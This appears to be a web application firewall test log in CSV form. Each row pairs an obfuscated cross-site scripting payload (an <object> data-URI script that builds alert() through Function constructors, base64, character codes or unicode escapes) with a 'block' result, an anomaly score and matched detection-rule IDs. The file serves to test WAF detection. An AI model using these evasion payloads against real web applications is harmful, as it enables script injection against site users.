1772,"<object data=""data:text/html,<script>(new window['Function'](String.fromCharCode(97,108,101,114,116,40,49,50,41)))()</script>"">",0,1,block,12,"932130,933210,934100,941100,941110,941130,941140,941160,941170,941300,941370,949110","o35,78v217,127t:urlDecodeUni,t:cmdLine || o37,79v217,127t:urlDecode,t:replaceComments,t:compressWhitespace || o61,19v217,127 || v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o42,18v217,127t:urlDecodeUni,t:compressWhitespace || ",55,177603486020.422983
1773,"<object data=""data:text/html,<script>(new Function(atob('YWxlcnQoMTIp'.concat(''))))()</script>"">",0,1,block,10,"932130,934100,941100,941110,941130,941140,941160,941170,941300,949110","o35,46v217,97t:urlDecodeUni,t:cmdLine || o38,13v217,97 || v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,177603486177.041445
1774,"<object data=""data:text/html,<script>(new Function(['a','l','e','r','t','(','1','2',')'].join('')))()</script>"">",0,1,block,10,"932130,934100,941100,941110,941130,941140,941160,941170,941300,949110","o35,44v217,112t:urlDecodeUni,t:cmdLine || o38,13v217,112 || v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,177603486294.149399
1775,"<object data=""data:text/html,<script>(Function.prototype.constructor(atob('YWxlcnQoMTIp'))())</script>"">",0,1,block,10,"932130,933210,941100,941110,941130,941140,941160,941170,941300,949110","o35,55v217,104t:urlDecodeUni,t:cmdLine || o37,56v217,104t:urlDecode,t:replaceComments,t:compressWhitespace || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,177603486381.876913
1776,"<object data=""data:text/html,<script>(new/**/Function(atob('YWxlcnQoMTIp')))()</script>"">",0,1,block,9,"932130,941100,941110,941130,941140,941160,941170,941300,949110","o35,40v217,89t:urlDecodeUni,t:cmdLine || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603486485.062831
1777,"<object data=""data:text/html,<script>(new&#x09;Function(atob('YWxlcnQoMTIp')))()</script>"">",0,1,block,9,"932130,941100,941110,941130,941140,941160,941170,941300,949110","o35,42v217,91t:urlDecodeUni,t:cmdLine || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603486571.123896
1778,"<object data=""data:text/html,<script>(new Function(atob('YWxlcnQoMTIp'))).call()</script>"">",0,1,block,10,"932130,934100,941100,941110,941130,941140,941160,941170,941300,949110","o35,42v217,91t:urlDecodeUni,t:cmdLine || o38,13v217,91 || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,177603486626.105066
1782,"<object data=""data:text/html,<script>Function(atob('YWxlcnQoMTIp'))()</script>"">",0,1,block,8,"941100,941110,941130,941140,941160,941170,941300,949110","v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603487124.120328
1783,"<object data=""data:text/html,<script>(new Function(atob('YWxlcnQoMTIp'))).apply()</script>"">",0,1,block,10,"932130,934100,941100,941110,941130,941140,941160,941170,941300,949110","o35,43v217,92t:urlDecodeUni,t:cmdLine || o38,13v217,92 || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,177603487289.691692
1789,"<object data=""data:text/html,<script>window['const'+'ructor']['const'+'ructor']('retu'+'rn\x20ale'+'rt')()('1')</script>""></object>",0,1,block,10,"933210,941100,941110,941130,941140,941160,941170,941300,941370,949110","o43,68v217,131t:urlDecode,t:replaceComments,t:compressWhitespace || v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o37,24v217,131t:urlDecodeUni,t:compressWhitespace || ",45,177603487916.678425
1790,"<object data=""data:text/html,<script>[]['const'+'ructor']['const'+'ructor']('ale'%2b'rt(1)')['call']()</script>""></object>",0,1,block,9,"933210,941100,941110,941130,941140,941160,941170,941300,949110","o37,63v217,122t:urlDecode,t:replaceComments,t:compressWhitespace || v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603488022.353554
1793,"<object data=""data:text/html,<script>Function('al'%2bString.fromCodePoint(0x65,0x72,0x74)%2b'(1)')()</script>""></object>",0,1,block,8,"941100,941110,941130,941140,941160,941170,941300,949110","v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603488362.695295
1796,"<object data=""data:text/html,<script>(''['const'%2b'ructor']['const'%2b'ructor']('return\x20this')())['Function']('ale'+'rt(1)')()</script>""></object>",0,1,block,10,"932130,933210,941100,941110,941130,941140,941160,941170,941300,949110","o35,71v217,150t:urlDecodeUni,t:cmdLine || o94,32v217,150t:urlDecode,t:replaceComments,t:compressWhitespace || v217,150t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,150t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,150t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,150t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,150t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,150t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,150t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,17760348873.727446
1798,"<object data=""data:text/html,<script>globalThis['Functi'%2b'on']('ale'%2b'rt'.concat('(1)'))()</script>""></object>",0,1,block,8,"941100,941110,941130,941140,941160,941170,941300,949110","v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603488931.565814
1799,"<object data=""data:text/html,<script>Function(String.fromCharCode(97,108,101,114,116,40,49,41))()</script>""></object>",0,1,block,9,"934100,941100,941110,941130,941140,941160,941170,941300,949110","o46,19v217,117 || v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603489044.965408
1800,"<object data=""data:text/html,<script>this['Functi'+'on']['call'](null,'ale'+'rt(1)')()</script>""></object>",0,1,block,10,"933210,941100,941110,941130,941140,941160,941170,941300,941370,949110","o41,45v217,106t:urlDecode,t:replaceComments,t:compressWhitespace || v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o37,19v217,106t:urlDecodeUni,t:compressWhitespace || ",45,177603489196.176746
1803,"<object data=""data:text/html,<script>Function(...['ale'+'rt(1)'])()</script>""></object>",0,1,block,8,"941100,941110,941130,941140,941160,941170,941300,949110","v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603489584.385587
1804,"<object data=""data:text/html,<script>[].filter['const'%2b'ructor']('ale'%2b'rt(1)')()</script>""></object>",0,1,block,8,"941100,941110,941130,941140,941160,941170,941300,949110","v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603489653.809853
1808,"<object data=""data:text/html,<script>new(Function)('\u0061lert(1)')()</script>""></object>",0,1,block,9,"933210,941100,941110,941130,941140,941160,941170,941300,949110","o40,29v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603490134.041014
1809,"<object data=""data:text/html,<script>new/**/Function('\u0061\u006c\u0065\u0072\u0074(1)')()</script>""></object>",0,1,block,8,"941100,941110,941130,941140,941160,941170,941300,949110","v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603490272.422880
1810,"<object data=""data:text/html,<script>new Function(String.fromCharCode(97,108,101,114,116,40,49,41))()</script>""></object>",0,1,block,9,"934100,941100,941110,941130,941140,941160,941170,941300,949110","o37,13v217,121 || v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603490322.497568
1813,"<object data=""data:text/html,<script>new Function(`\u0061\u006c\u0065\u0072\u0074(1)`)()</script>""></object>",0,1,block,9,"934100,941100,941110,941130,941140,941160,941170,941300,949110","o37,13v217,108 || v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603490668.961979
1817,"<object data=""data:text/html,<script>new Function(atob('YWxlcnQoMSk'))()</script>""></object>",0,1,block,9,"934100,941100,941110,941130,941140,941160,941170,941300,949110","o37,13v217,92 || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,17760349110.721994
1818,"<object data=""data:text/html,<script>new[Function][0]('\u0061\u006c\u0065\u0072\u0074(1)')()</script>""></object>",0,1,block,9,"933210,941100,941110,941130,941140,941160,941170,941300,949110","o40,52v217,112t:urlDecode,t:replaceComments,t:compressWhitespace || v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603491274.030808
1820,"<object data=""data:text/html,<script>new Function('\141\154\145\162\164(1)')()</script>""></object>",0,1,block,9,"934100,941100,941110,941130,941140,941160,941170,941300,949110","o37,13v217,98 || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603491411.567910
